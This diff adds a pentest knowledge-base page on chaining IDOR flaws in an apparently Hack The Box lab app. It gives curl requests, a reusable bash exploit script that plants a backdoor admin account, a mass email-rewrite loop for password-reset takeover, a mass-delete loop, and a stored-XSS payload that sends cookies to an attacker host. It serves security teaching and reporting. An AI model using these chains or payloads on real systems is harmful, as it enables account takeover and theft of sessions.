@@ -1,0 +1,459 @@
+---
+title: Chaining
+description: How disclosure IDORs feed mutation IDORs feed privilege-escalation IDORs - the canonical end-to-end Employee Manager walkthrough showing GET-to-leak-uuid → PUT-with-matching-uuid → role-name-leak → role-escalation → admin function call, with each step's request and response.
+mitre: [T1190, T1213, T1556, T1078]
+d3fend: [D3-IAA]
+impact: [AccountTakeover, AuthBypass, PrivilegeEscalation, DataExfil]
+owasp: [A01]
+sidebar:
+  order: 5
+  label: Chaining
+---
+
+## TL;DR
+
+A single IDOR rarely yields the full impact. Chains combine three primitives in sequence: disclosure → modification → privilege escalation. Each step's output supplies the next step's input.
+
+```
+# 1. Disclosure - leak the uuid you need to bypass mismatch defenses
+GET /api/profile/2 → {"uuid": "4a9bd...", "role": "employee"}
+
+# 2. Modification - write to someone else's record with their uuid
+PUT /api/profile/2 with {"uid":2, "uuid":"4a9bd...", "email":"attacker@evil"}
+
+# 3. Privilege escalation - discover admin role name, set it on yourself
+for i in 1..100; do GET /api/profile/$i; done → find admin record's role string
+PUT /api/profile/1 with {"role":"web_admin", ...}
+
+# 4. Admin function call - now you can use admin-only endpoints
+POST /api/profile/new with {"role":"web_admin"}    # create backdoor account
+```
+
+Success indicator: each step's response is "success" (not an access-control error), and you end up with an account-level admin capability - create/delete users, modify any record, full takeover of the application.
+
+## The chain structure
+
+Every IDOR chain follows the same arc:
+
+| Stage | Primitive | What you have before | What you have after |
+| --- | --- | --- | --- |
+| 1 | Disclosure | One test account | Foreign uuids, full record schemas, role names |
+| 2 | Modification | Foreign uuids | Ability to change foreign records |
+| 3 | Self-escalation | Knowledge of admin role's string | Your own account is admin |
+| 4 | Admin abuse | Admin role | Create/delete users, mass-modify, full app control |
+
+Some chains skip stages - for example, when the admin-role string is "admin" (guessable), stage 3 doesn't need stage 1's enumeration. Most modern apps name roles less obviously (`web_admin`, `superuser`, `internal-staff`, `system-administrator`), making the disclosure-driven enumeration necessary.
+
+## The Employee Manager walkthrough
+
+A realistic engagement combining all four stages. The app:
+
+- Users have profiles with `uid`, `uuid`, `role`, `full_name`, `email`, `about`
+- Profile management at `/profile` (UI) and `/profile/api.php/profile/<id>` (API)
+- Edit-profile via PUT to the API
+- Create-user / delete-user gated by `role=admin` cookie check on the back-end
+- Test account: `htb-student` with `uid=1`, role `employee`
+
+### Step 0 - Reconnaissance
+
+Log in. Walk the app. In Burp's HTTP history, identify the API endpoints:
+
+```
+GET    /profile                          ← HTML page
+GET    /profile/api.php/profile/1        ← own profile JSON
+PUT    /profile/api.php/profile/1        ← update own profile
+POST   /profile/api.php/profile/new      ← (only invoked by admin UI)
+DELETE /profile/api.php/profile/<id>     ← (only invoked by admin UI)
+```
+
+The `POST` and `DELETE` endpoints are not used by your role's UI but the JS bundle defines them - they're admin-only client-side. Worth probing.
+
+Front-end JS reveals:
+
+```javascript
+function deleteEmployee(uid) {
+    if (!is_admin) return;
+    $.ajax({
+        url: '/profile/api.php/profile/' + uid,
+        type: 'DELETE',
+        ...
+    });
+}
+```
+
+The `if (!is_admin) return;` is client-side gating. The server-side gate is a separate question, and a chained IDOR target.
+
+### Step 1 - Naive substitution (and its failures)
+
+First try the obvious bypasses to confirm what's defended:
+
+```shell
+# Try to change our uid in the body
+$ curl -sb 'PHPSESSID=mine;role=employee' \
+       -X PUT 'http://target/profile/api.php/profile/1' \
+       -H 'Content-Type: application/json' \
+       -d '{
+         "uid": 2,
+         "uuid": "40f5888b67c748df7efba008e7c2f9d2",
+         "role": "employee",
+         "full_name": "X", "email": "X", "about": "X"
+       }'
+# {"error": "uid mismatch"}
+```
+
+```shell
+# Try to update profile/2 with our uuid
+$ curl -sb 'PHPSESSID=mine;role=employee' \
+       -X PUT 'http://target/profile/api.php/profile/2' \
+       -H 'Content-Type: application/json' \
+       -d '{
+         "uid": 2,
+         "uuid": "40f5888b67c748df7efba008e7c2f9d2",
+         "role": "employee", ...
+       }'
+# {"error": "uuid mismatch"}
+```
+
+```shell
+# Try POST to create new user
+$ curl -sb 'PHPSESSID=mine;role=employee' \
+       -X POST 'http://target/profile/api.php/profile/new' \
+       -d '{...}'
+# {"error": "Creating new employees is for admins only"}
+```
+
+```shell
+# Try setting our role to admin
+$ curl -sb 'PHPSESSID=mine;role=employee' \
+       -X PUT 'http://target/profile/api.php/profile/1' \
+       -d '{"uid":1, "uuid":"40f5...", "role":"admin", ...}'
+# {"error": "Invalid role"}    ← guessed wrong role name
+```
+
+Four naive bypasses, four blocks. But each tells you about a different defense layer:
+
+- **uid mismatch** → request fields are validated against each other
+- **uuid mismatch** → same, plus uuid is checked against DB
+- **admin role check** → POST/DELETE require `role=admin` cookie
+- **role enum check** → role field is validated against a whitelist (but the whitelist content is unknown)
+
+None of these defenses check whether the *caller* is the owner of the target resource. They check field consistency and role-enum-validity. That's the gap.
+
+### Step 2 - The GET-disclosure pivot
+
+The defenses for PUT, POST, DELETE all require fields you don't yet have (foreign uuid, admin role string). The GET endpoint hasn't been protected - most apps secure write paths and forget read paths.
+
+```shell
+$ curl -sb 'PHPSESSID=mine;role=employee' \
+       'http://target/profile/api.php/profile/2'
+
+{
+    "uid": "2",
+    "uuid": "4a9bd19b3b8676199592a346051f950c",
+    "role": "employee",
+    "full_name": "Iona Franklyn",
+    "email": "i_franklyn@employees.htb",
+    "about": "..."
+}
+```
+
+Got user 2's uuid. The disclosure IDOR is confirmed.
+
+### Step 3 - Mass enumeration to find the admin
+
+Loop through `uid=1..100` and capture all records:
+
+```bash
+$ for i in $(seq 1 100); do
+    curl -sb 'PHPSESSID=mine;role=employee' \
+         "http://target/profile/api.php/profile/$i" \
+      | jq -c .
+  done > all-profiles.json
+```
+
+Filter for non-employee roles:
+
+```shell
+$ jq 'select(.role != "employee")' all-profiles.json
+
+{
+    "uid": "52",
+    "uuid": "a36fa9e66e85f2dd6f5e13cad45248ae",
+    "role": "web_admin",
+    "full_name": "administrator",
+    "email": "webadmin@employees.htb",
+    "about": "HTB{this_isnt_the_real_flag}"
+}
+```
+
+Two values acquired:
+- `web_admin` is the admin role string (use it in PUT for self-escalation)
+- The admin's uuid is `a36fa9e66e85f2dd6f5e13cad45248ae` (use it in PUT to modify the admin's record)
+
+### Step 4 - Self-escalation
+
+Set your own role to `web_admin` via PUT. The mismatch defense doesn't block this because:
+
+- `uid: 1` matches the URL path `/profile/1` (no uid mismatch)
+- `uuid: 40f5...` (your own) matches the DB for uid 1 (no uuid mismatch)
+- `role: web_admin` is in the allowed-roles whitelist (no invalid-role error)
+
+```shell
+$ curl -sb 'PHPSESSID=mine;role=employee' \
+       -X PUT 'http://target/profile/api.php/profile/1' \
+       -H 'Content-Type: application/json' \
+       -d '{
+         "uid": 1,
+         "uuid": "40f5888b67c748df7efba008e7c2f9d2",
+         "role": "web_admin",
+         "full_name": "Amy Lindon",
+         "email": "a_lindon@employees.htb",
+         "about": "..."
+       }'
+# {"success": true}
+```
+
+Confirm:
+
+```shell
+$ curl -sb 'PHPSESSID=mine;role=employee' \
+       'http://target/profile/api.php/profile/1' | jq .role
+"web_admin"
+```
+
+Your DB record is now admin. But the cookie is still `role=employee` - the back-end `role=admin` checks for POST/DELETE will still fail until the cookie reflects the new role.
+
+### Step 5 - Refresh the role cookie
+
+Two paths to update the cookie:
+
+**Path A - re-login.** The login flow reads the DB-stored role and sets the cookie accordingly. Logging out and back in produces a new cookie:
+
+```
+Set-Cookie: role=web_admin
+```
+
+**Path B - set the cookie manually.** Since the cookie is client-trusted (the whole reason this is exploitable), you can just edit it:
+
+```shell
+$ curl -sb 'PHPSESSID=mine;role=web_admin' \
+       -X POST 'http://target/profile/api.php/profile/new' \
+       -H 'Content-Type: application/json' \
+       -d '{
+         "uid": 101,
+         "uuid": "deadbeefdeadbeefdeadbeefdeadbeef",
+         "role": "web_admin",
+         "full_name": "backdoor",
+         "email": "backdoor@attacker.com",
+         "about": ""
+       }'
+# {"success": true}
+```
+
+The back-end `role=admin` check passes because the cookie now says `web_admin`. The new user is created with `web_admin` privileges.
+
+### Step 6 - Confirm the backdoor
+
+```shell
+$ curl -sb 'PHPSESSID=mine;role=web_admin' \
+       'http://target/profile/api.php/profile/101' | jq
+
+{
+    "uid": "101",
+    "uuid": "deadbeefdeadbeefdeadbeefdeadbeef",
+    "role": "web_admin",
+    "full_name": "backdoor",
+    "email": "backdoor@attacker.com",
+    "about": ""
+}
+```
+
+A persistent admin account exists. Even if the operator's session expires or the target patches the IDOR chain, the backdoor remains until manually pruned.
+
+## Alternative chain endings
+
+Instead of (or in addition to) creating a backdoor admin account, the same primitives unlock these outcomes:
+
+### Mass email-rewrite for password-reset hijack
+
+```bash
+# Read every uuid
+$ jq -r '"\(.uid) \(.uuid)"' all-profiles.json > targets.txt
+
+# Rewrite every email to one you control
+while read uid uuid; do
+    curl -sb 'PHPSESSID=mine;role=web_admin' \
+         -X PUT "http://target/profile/api.php/profile/$uid" \
+         -H 'Content-Type: application/json' \
+         -d "{
+           \"uid\": $uid,
+           \"uuid\": \"$uuid\",
+           \"role\": \"employee\",
+           \"email\": \"victim${uid}@attacker.com\",
+           \"full_name\": \"...\",
+           \"about\": \"...\"
+         }"
+done < targets.txt
+```
+
+Then trigger password reset for each - reset link arrives at attacker email. Mass account takeover.
+
+### Stored XSS via the "about" field
+
+If the `about` field renders unescaped on the profile page (and admins occasionally view employee profiles), inject XSS:
+
+```bash
+$ curl -sb 'PHPSESSID=mine;role=web_admin' \
+       -X PUT 'http://target/profile/api.php/profile/52' \
+       -H 'Content-Type: application/json' \
+       -d "{
+         \"uid\": 52,
+         \"uuid\": \"a36fa9e66e85f2dd6f5e13cad45248ae\",
+         \"role\": \"web_admin\",
+         \"full_name\": \"administrator\",
+         \"email\": \"webadmin@employees.htb\",
+         \"about\": \"<script>fetch('http://attacker:8000/?c='+document.cookie)</script>\"
+       }"
+```
+
+Admin views their own profile (a common workflow), XSS fires in admin's browser, cookie exfiltrates to attacker. See [XSS to session](/codex/web/sessions/xss-to-session/) for the callback infrastructure.
+
+### Delete the audit trail
+
+When the app has a `delete` capability and tracks the deletion in an audit log:
+
+```shell
+# Delete users en masse to denial-of-service the app
+$ for uid in $(seq 1 100); do
+    curl -sb 'PHPSESSID=mine;role=web_admin' \
+         -X DELETE "http://target/profile/api.php/profile/$uid"
+  done
+
+# Or selectively delete audit records that mention you
+```
+
+Generally not desirable in a real engagement (destructive, irreversible, alerts the SOC immediately) but worth documenting as a capability the chain enables.
+
+## When the chain hits a wall
+
+Common stopping points and the workarounds:
+
+### Stage 1 fails - GET is access-controlled
+
+If GET on foreign profiles returns 403 / "access denied", the disclosure IDOR isn't there.
+
+Workarounds:
+- **Try alternate GET endpoints.** `/api/profile/2` might be defended; `/api/users/2`, `/api/employees/2`, `/api/me?id=2`, `/api/admin/users` might not.
+- **Look for collection endpoints.** A `/api/employees` listing endpoint might dump every user's data in one response.
+- **Probe for verb tampering.** GET is defended; HEAD might not be. HEAD reveals the response headers including `Content-Length` - sometimes a leak in itself.
+- **Look for analytics/reporting endpoints** that aggregate user data without per-user access control.
+
+### Stage 2 fails - uuid mismatch can't be bypassed
+
+If the GET disclosure works but PUT still fails because the disclosed uuid is "wrong" for the target (e.g., apps that compute uuid from session_id rather than storing per-user uuid):
+
+- **Test if uuid is checked against the DB or computed on-the-fly.** Submit a deliberately wrong uuid; if the error message changes, that's a hint.
+- **Look for a separate PATCH endpoint.** PATCH sometimes has weaker validation than PUT.
+- **Try mass-assignment via POST.** Apps that block PUT on existing records sometimes allow POST that creates-or-updates, and the POST flow has different validation.
+
+### Stage 3 fails - invalid role for every guess
+
+If the role whitelist doesn't include any obvious admin string:
+
+- **Look for non-role privilege fields.** `is_admin: true`, `permissions: ["admin"]`, `groups: ["administrators"]` might be honored where `role: "admin"` isn't.
+- **Look for nested role objects.** `role: {name: "admin"}` or `role_id: 1` might bypass a flat-string check.
+- **Multi-account discovery.** If you can register a second account, sometimes the default role for new accounts differs subtly from existing users - and reading the registration POST response reveals more about the role schema.
+
+### Stage 4 fails - admin endpoints still reject
+
+The role cookie says admin but POST `/api/profile/new` still returns "for admins only":
+
+- **The back-end checks against the DB role, not the cookie.** Re-login is required.
+- **The back-end checks against a different authorization layer.** Maybe `Authorization: Bearer <token>` claims, not the cookie. Find where the original admin's privilege actually comes from.
+- **Different verbs have different auth.** POST is admin-only via cookie *and* the body parsing checks for a CSRF token bound to admin session. See [CSRF token bypass](/codex/web/sessions/csrf-token-bypass/).
+
+## The complete chain - one-shot script
+
+For documentation / re-use across similar targets:
+
+```bash
+#!/bin/bash
+# IDOR chain exploitation, generic template
+SESSION='PHPSESSID=mine'
+BASE='http://target/profile/api.php/profile'
+MY_UID=1
+MY_UUID='40f5888b67c748df7efba008e7c2f9d2'
+
+# Stage 1: Mass disclosure
+echo "[+] Stage 1: Enumerating profiles"
+for i in $(seq 1 200); do
+    curl -sb "$SESSION;role=employee" "$BASE/$i" 2>/dev/null
+done | jq -c 'select(.uid != null)' > all.json
+
+# Stage 2: Find admin role
+echo "[+] Stage 2: Identifying admin role"
+ADMIN_ROLE=$(jq -r 'select(.role != "employee") | .role' all.json | head -1)
+echo "    Admin role string: $ADMIN_ROLE"
+
+# Stage 3: Self-escalate
+echo "[+] Stage 3: Escalating own role to $ADMIN_ROLE"
+curl -sb "$SESSION;role=employee" -X PUT "$BASE/$MY_UID" \
+     -H 'Content-Type: application/json' \
+     -d "{
+       \"uid\": $MY_UID,
+       \"uuid\": \"$MY_UUID\",
+       \"role\": \"$ADMIN_ROLE\",
+       \"full_name\": \"Amy Lindon\",
+       \"email\": \"a@b.c\",
+       \"about\": \"\"
+     }"
+
+# Stage 4: Create backdoor admin
+echo "[+] Stage 4: Creating backdoor admin"
+curl -sb "$SESSION;role=$ADMIN_ROLE" -X POST "$BASE/new" \
+     -H 'Content-Type: application/json' \
+     -d "{
+       \"uid\": 999,
+       \"uuid\": \"deadbeefdeadbeefdeadbeefdeadbeef\",
+       \"role\": \"$ADMIN_ROLE\",
+       \"full_name\": \"backdoor\",
+       \"email\": \"backdoor@attacker.com\",
+       \"about\": \"\"
+     }"
+
+echo "[+] Chain complete. Backdoor uid=999 with role=$ADMIN_ROLE"
+```
+
+## Reporting the chain
+
+Three separate findings, one composite impact:
+
+| Finding | Standalone severity | Chained role |
+| --- | --- | --- |
+| GET disclosure on `/api/profile/<id>` | Medium (leaks uuids, emails) | Enabling - unlocks PUT |
+| PUT on `/api/profile/<id>` without owner check | Medium (other users' record modification) | Privilege escalation pivot |
+| Role-field client-trust (PUT accepts arbitrary role string from whitelist) | Medium (own-role escalation) | Direct admin path |
+| Cookie-based privilege (role=admin) honored without DB check | Medium-High (client-side role assertion) | Final unlock |
+
+Combined: **unauthenticated path to administrative compromise** with a single low-privilege test account. Critical.
+
+The narrative is what justifies the upgrade. Each finding's "if I exploit only this, how bad is it" is moderate; together they form a kill chain.
+
+## Quick reference
+
+| Stage | Pattern |
+| --- | --- |
+| 1 - Discovery | Read JS for AJAX endpoints, probe `OPTIONS /api/*` for accepted verbs |
+| 2 - Naive failure | Try `uid=other` in body, target `/foreign` with own uuid; observe error names |
+| 3 - Disclosure | `curl GET /api/profile/<id>` for each id, save responses |
+| 4 - Role name leak | `jq 'select(.role != "<your_role>")'` over disclosure output |
+| 5 - Self-escalate | PUT own record with `role: "<admin_role>"`, matching own uid+uuid |
+| 6 - Cookie refresh | Re-login OR set `Cookie: role=<admin_role>` manually |
+| 7 - Admin actions | POST/DELETE on admin-only endpoints now work |
+| Bypass uid mismatch | Match request fields (uid, uuid, path) consistently |
+| Bypass uuid mismatch | Use GET to harvest target's uuid first |
+| Bypass invalid role | Use a real role string from disclosed records |
+| Bypass admin-only POST | Set cookie role manually after self-escalation |
+| Alternate endings | Mass email rewrite → password reset hijack; XSS in `about` field; mass DELETE |
+
+For the verb-tampering details that often appear alongside in these chains, see [Verb tampering](/codex/web/auth/verb-tampering/). For session-attack delivery patterns, see [Sessions cluster](/codex/web/sessions/). For when the chain culminates in XML/XXE attacks (admin-only event-creation surfaces, for example), see the [XXE cluster](/codex/web/xxe/).
